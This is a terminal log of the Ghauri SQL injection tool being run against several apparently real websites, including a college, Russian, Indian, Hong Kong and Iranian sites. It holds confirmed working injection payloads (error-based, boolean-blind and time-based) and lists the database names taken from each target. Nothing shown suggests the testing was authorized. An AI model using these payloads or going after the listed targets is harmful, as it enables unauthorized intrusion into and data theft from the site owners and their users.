+[03:53:56] [WARNING] target URL content is not stable (i.e. content differs). Ghauri will base the page comparison on a textual content, Switching to 'text-only'
+[03:53:57] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[03:53:57] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+
+for the remaining tests, do you want to include all tests for 'MySQL'? [Y/n] y
+
+[03:54:17] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[03:54:32] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[03:54:44] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[03:54:58] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[03:55:07] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[03:55:10] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable
+[03:55:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[03:55:13] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="18168")
+[03:55:13] [INFO] testing 'MySQL >= 5.0.12 time-based blind (query SLEEP)'
+[03:55:13] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[03:55:18] [INFO] testing 'MySQL >= 5.0.12 time-based blind (IF - comment)'
+[03:55:26] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[03:55:31] [INFO] testing 'MySQL >= 5.0.12 time-based blind (CASE STATEMENT)'
+[03:55:36] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - CASE STATEMENT)'
+[03:55:40] [INFO] testing 'MySQL >= 5.0.12 time-based blind (SLEEP)'
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+
+Ghauri identified the following injection point(s) with a total of 54 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: id=151' AND GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44),1337)-- wXyW
+
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=151' AND 01244=1244-- wXyW
+---
+[03:55:48] [INFO] testing MySQL
+[03:55:48] [INFO] confirming MySQL
+[03:55:48] [INFO] the back-end DBMS is MySQL
+[03:55:48] [INFO] fetching database names
+[03:55:48] [INFO] fetching number of databases
+[03:55:54] [INFO] retrieved: 3
+[03:56:05] [INFO] retrieved: information_schema
+[03:56:11] [INFO] retrieved: sadiykwj_purbanchal
+[03:56:16] [INFO] retrieved: sadiykwj_purbanchal1
+available databases [3]:
+[*] information_schema
+[*] sadiykwj_purbanchal
+[*] sadiykwj_purbanchal1
+
+[03:56:16] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/purbanchalcollege.ac.in'
+
+[*] ending @ 03:56:16 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop/Breacher]
+└─$ 
+
+
+
+┌──(unknonehart㉿unknone)-[~/Desktop/Breacher]
+└─$ ghauri -u "http://www.cmkoo.com.hk/tc/news/news.php?id=28/' --dbs                                                      
+dquote> 
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop/Breacher]
+└─$ ghauri -u "http://www.cmkoo.com.hk/tc/news/news.php?id=28/" --dbs
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 02:33:46 /2025-11-29/
+
+[02:33:46] [INFO] testing connection to the target URL
+[02:33:47] [INFO] testing if the target URL content is stable
+[02:33:48] [INFO] target URL content is stable
+[02:33:48] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[02:33:48] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+
+for the remaining tests, do you want to include all tests for 'MySQL'? [Y/n] y
+
+[02:33:54] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[02:33:58] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[02:34:02] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[02:34:05] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[02:34:09] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[02:34:13] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[02:34:17] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[02:34:21] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[02:34:24] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (DOUBLE)'
+[02:34:28] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (DOUBLE)'
+[02:34:31] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[02:34:40] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE or HAVING clause (FLOOR)'
+[02:34:44] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[02:34:44] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' injectable
+[02:34:44] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[02:34:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[02:34:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[02:34:46] [INFO] testing 'Boolean-based blind - Parameter replace'
+[02:34:48] [INFO] GET parameter 'id' appears to be 'Boolean-based blind - Parameter replace' injectable (with --string="y Limited")
+[02:34:48] [INFO] testing 'MySQL >= 5.0.12 time-based blind (query SLEEP)'
+[02:34:54] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 time-based blind (query SLEEP)' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+
+Ghauri identified the following injection point(s) with a total of 148 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)
+    Payload: id=28/UPDATEXML(0,CONCAT(0x7e,0x72306f746833783439,0x7e),0)
+
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace
+    Payload: id=28/ (SELECT (CASE WHEN (05878=5878) THEN 03586 ELSE 3*(SELECT 2 UNION ALL SELECT 1) END))--
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind (query SLEEP)
+    Payload: id=28/ (SELECT(0)FROM(SELECT(SLEEP(6)))a)--
+---
+[02:35:47] [INFO] testing MySQL
+[02:35:47] [INFO] confirming MySQL
+[02:35:47] [INFO] the back-end DBMS is MySQL
+[02:35:47] [INFO] fetching database names
+[02:35:47] [INFO] fetching number of databases
+[02:35:48] [INFO] retrieved: 2
+[02:35:49] [INFO] retrieved: information_schema
+[02:35:50] [INFO] retrieved: cmkoo_com_hk
+available databases [2]:
+[*] cmkoo_com_hk
+[*] information_schema
+
+[02:35:50] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/www.cmkoo.com.hk'
+
+[*] ending @ 02:35:50 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop/Breacher]
+└─$ 
+
+
+
+──(unknonehart㉿unknone)-[~/Desktop/Breacher]
+└─$ ghauri -u "https://dsource.co.in/portal/jobview.php?id=6272" --dbs                     
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 02:48:19 /2025-11-29/
+
+[02:48:19] [INFO] testing connection to the target URL
+Ghauri resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE or HAVING clause (FLOOR)
+    Payload: id=6272 OR 1 GROUP BY CONCAT_WS(0x7e,0x72306f746833783439,FLOOR(RAND(0)*2))HAVING(MIN(0))-- wXyW
+
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=6272 AND 07858=7858-- wXyW
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind (IF - comment)
+    Payload: id=if(now()=sysdate(),SLEEP(8),0)
+---
+[02:48:22] [INFO] testing MySQL
+[02:48:22] [INFO] confirming MySQL
+[02:48:22] [INFO] the back-end DBMS is MySQL
+[02:48:22] [INFO] fetching database names
+[02:48:22] [INFO] fetching number of databases
+[02:48:26] [WARNING] it was not possible to extract query output length for the SQL query provided.
+[02:48:29] [WARNING] it was not possible to extract query output length for the SQL query provided.
+[02:48:29] [WARNING] the SQL query provided does not return any output
+[02:48:29] [ERROR] unable to retrieve the number of databases
+[02:48:29] [INFO] fetching current database
+[02:48:36] [INFO] resumed: 'dialugbz_ats'
+current database: 'dialugbz_ats'
+
+[02:48:36] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/dsource.co.in'
+
+[*] ending @ 02:48:36 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop/Breacher]
+└─$ 
+
+
+
+┌──(unknonehart㉿unknone)-[~/Desktop/Breacher]
+└─$ ghauri -u "http://www.slavyanca.ru/content.php?id=157" --dbs                             
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 02:34:34 /2025-11-29/
+
+[02:34:34] [INFO] testing connection to the target URL
+[02:34:35] [INFO] testing if the target URL content is stable
+[02:34:36] [INFO] target URL content is stable
+[02:34:37] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[02:34:37] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+
+for the remaining tests, do you want to include all tests for 'MySQL'? [Y/n] y
+
+[02:35:39] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[02:35:48] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[02:35:56] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[02:36:04] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[02:36:13] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[02:36:21] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[02:36:29] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[02:36:37] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[02:36:46] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (DOUBLE)'
+[02:36:54] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (DOUBLE)'
+[02:37:02] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[02:37:03] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
+[02:37:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[02:37:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[02:37:06] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[02:37:07] [INFO] testing 'Boolean-based blind - Parameter replace'
+[02:37:16] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[02:37:18] [INFO] testing 'boolean-based blind - WHERE or HAVING clause (CASE STATEMENT)'
+[02:37:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[02:37:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[02:37:22] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[02:37:23] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[02:37:25] [INFO] GET parameter 'id' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable
+[02:37:25] [INFO] testing 'MySQL >= 5.0.12 time-based blind (query SLEEP)'
+[02:37:26] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[02:37:32] [INFO] testing 'MySQL >= 5.0.12 time-based blind (IF - comment)'
+[02:37:51] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 time-based blind (IF - comment)' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+
+Ghauri identified the following injection point(s) with a total of 124 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=157 AND (SELECT(0)FROM(SELECT COUNT(*),CONCAT_WS(0x28,0x7e,0x72306f746833783439,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- wXyW
+
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: id=157 RLIKE (SELECT (CASE WHEN (04049=4049) THEN 157 ELSE 0x28 END))-- wXyW
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind (IF - comment)
+    Payload: id=157'XOR(if(now()=sysdate(),SLEEP(6),0))XOR'Z
+---
+[02:38:08] [INFO] testing MySQL
+[02:38:08] [INFO] confirming MySQL
+[02:38:08] [INFO] the back-end DBMS is MySQL
+[02:38:08] [INFO] fetching database names
+[02:38:08] [INFO] fetching number of databases
+[02:38:09] [INFO] retrieved: 5
+[02:38:10] [INFO] retrieved: information_schema
+[02:38:11] [INFO] retrieved: udb2273
+[02:38:13] [INFO] retrieved: udb2273_2
+[02:38:14] [INFO] retrieved: udb2273_3
+[02:38:15] [INFO] retrieved: udb2273_4
+available databases [5]:
+[*] udb2273_3
+[*] udb2273_2
+[*] udb2273_4
+[*] udb2273
+[*] information_schema
+
+[02:38:15] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/www.slavyanca.ru'
+
+[*] ending @ 02:38:15 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop/Breacher]
+└─$ 
+
+
+
+┌──(unknonehart㉿unknone)-[~/Desktop/Breacher]
+└─$ ghauri -u "https://large.szgmu.ru/dissovet/index.php?id=568&k=4" --dbs                   
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 02:34:50 /2025-11-29/
+
+[02:34:50] [INFO] testing connection to the target URL
+[02:34:52] [INFO] testing if the target URL content is stable
+[02:34:53] [INFO] target URL content is stable
+[02:34:55] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[02:34:55] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+
+for the remaining tests, do you want to include all tests for 'MySQL'? [Y/n] y
+
+[02:35:36] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[02:35:44] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[02:35:53] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[02:36:01] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[02:36:09] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[02:36:12] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable
+[02:36:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[02:36:13] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
+[02:36:13] [INFO] testing 'MySQL >= 5.0.12 time-based blind (query SLEEP)'
+[02:36:14] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[02:36:21] [INFO] testing 'MySQL >= 5.0.12 time-based blind (IF - comment)'
+[02:36:28] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 time-based blind (IF - comment)' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+
+Ghauri identified the following injection point(s) with a total of 54 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: id=568' AND GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44),1337)-- wXyW&k=4
+
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=568' AND 08421=8421-- wXyW&k=4
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind (IF - comment)
+    Payload: id=568'XOR(if(now()=sysdate(),SLEEP(6),0))XOR'Z&k=4
+---
+[02:37:34] [INFO] testing MySQL
+[02:37:34] [INFO] confirming MySQL
+[02:37:34] [INFO] the back-end DBMS is MySQL
+[02:37:34] [INFO] fetching database names
+[02:37:34] [INFO] fetching number of databases
+[02:37:35] [INFO] retrieved: 12
+[02:37:36] [INFO] retrieved: information_schema
+[02:37:38] [INFO] retrieved: dissovet
+[02:37:40] [INFO] retrieved: gallery
+[02:37:41] [INFO] retrieved: mysql
+[02:37:42] [INFO] retrieved: performance_schema
+[02:37:42] [INFO] retrieved: price
+[02:37:43] [INFO] retrieved: spbmapo2
+[02:37:44] [INFO] retrieved: spbmapo_kaf
+[02:37:45] [INFO] retrieved: spbmapo_test
+[02:37:46] [INFO] retrieved: test
+[02:37:48] [INFO] retrieved: ymaps_bd
+[02:37:50] [INFO] retrieved: ymaps_bd2
+available databases [12]:
+[*] information_schema
+[*] dissovet
+[*] mysql
+[*] ymaps_bd
+[*] test
+[*] ymaps_bd2
+[*] spbmapo_kaf
+[*] spbmapo2
+[*] spbmapo_test
+[*] performance_schema
+[*] price
+[*] gallery
+
+[02:37:50] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/large.szgmu.ru'
+
+[*] ending @ 02:37:50 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop/Breacher]
+└─$ 
+
+
+
+┌──(unknonehart㉿unknone)-[~/Desktop/Breacher]
+└─$ ghauri -u "https://drsrikantswain.in/blogs.php?id=3" --dbs --timeout=30
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 04:17:53 /2025-11-29/
+
+[04:17:53] [INFO] testing connection to the target URL
+[04:17:54] [INFO] testing if the target URL content is stable
+[04:17:55] [INFO] target URL content is stable
+[04:17:55] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
+[04:17:55] [INFO] testing for SQL injection on GET parameter 'id'
+[04:17:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[04:18:05] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
+[04:18:07] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+
+[04:18:10] [INFO] testing 'MySQL >= 5.0.12 time-based blind (query SLEEP)'
+[04:18:10] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[04:18:14] [INFO] testing 'MySQL >= 5.0.12 time-based blind (IF - comment)'
+[04:18:56] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[04:19:00] [INFO] testing 'MySQL >= 5.0.12 time-based blind (CASE STATEMENT)'
+[04:19:31] [WARNING] in case of read timeout performing further tests to confirm if the detected payload is working..
+[04:20:33] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 time-based blind (CASE STATEMENT)' injectable (with error ReadTimeout on --timeout=30)
+[04:20:33] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[04:20:33] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[04:20:33] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[04:20:33] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[04:20:34] [INFO] testing 'MySQL >= 5.1 AND string error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[04:20:34] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[04:20:34] [INFO] checking if the injection point on GET parameter 'id' is a false positive
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+
+Ghauri identified the following injection point(s) with a total of 21 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=3' AND 01502=1502-- wXyW
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind (CASE STATEMENT)
+    Payload: id=3'XOR(SELECT CASE WHEN(1234=1234) THEN SLEEP(5) ELSE 0 END)XOR'Z
+---
+[04:21:17] [INFO] testing MySQL
+[04:21:17] [INFO] confirming MySQL
+[04:21:17] [INFO] the back-end DBMS is MySQL
+[04:21:17] [INFO] fetching database names
+[04:21:17] [INFO] fetching number of databases
+[04:21:18] [WARNING] Ghauri detected read timout '4' time(s), It is recommended to set high value of option(s) '--timeout' and also increase delay between each http request with an option '--delay'.
+[04:21:29] [INFO] retrieved: 2 
+[04:23:53] [INFO] retrieved: information_schema 
+[04:25:54] [INFO] retrieved: jexubtmn_database 
+available databases [2]:
+[*] information_schema
+[*] jexubtmn_database
+
+[04:25:54] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/drsrikantswain.in'
+
+[*] ending @ 04:25:54 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop/Breacher]
+└─$ 
+
+
+
+
+
+
+
+┌──(unknonehart㉿unknone)-[~/Desktop/Breacher]
+└─$ ghauri -u "http://eramtec.ir/project.php?id=10" --dbs                         
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 03:42:56 /2025-11-29/
+
+[03:42:56] [INFO] testing connection to the target URL
+[03:42:58] [INFO] testing if the target URL content is stable
+[03:42:59] [INFO] target URL content is stable
+[03:43:00] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[03:43:00] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+
+for the remaining tests, do you want to include all tests for 'MySQL'? [Y/n] y
+
+[03:44:38] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[03:44:46] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[03:44:54] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[03:45:01] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[03:45:09] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[03:45:16] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[03:45:23] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[03:45:31] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[03:45:38] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (DOUBLE)'
+[03:45:47] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (DOUBLE)'
+[03:45:54] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[03:46:02] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE or HAVING clause (FLOOR)'
+[03:46:10] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[03:46:22] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[03:46:31] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[03:46:38] [INFO] testing 'MySQL >= 5.1 AND string error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[03:46:46] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE or HAVING clause (UPDATEXML)'
+[03:46:53] [INFO] testing 'MySQL >= 5.1 error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (PROCEDURE ANALYSE)'
+[03:47:01] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[03:47:10] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE or HAVING clause (EXTRACTVALUE)'
+[03:47:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[03:47:21] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
+[03:47:21] [INFO] testing 'MySQL >= 5.0.12 time-based blind (query SLEEP)'
+[03:47:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[03:47:27] [INFO] testing 'MySQL >= 5.0.12 time-based blind (IF - comment)'
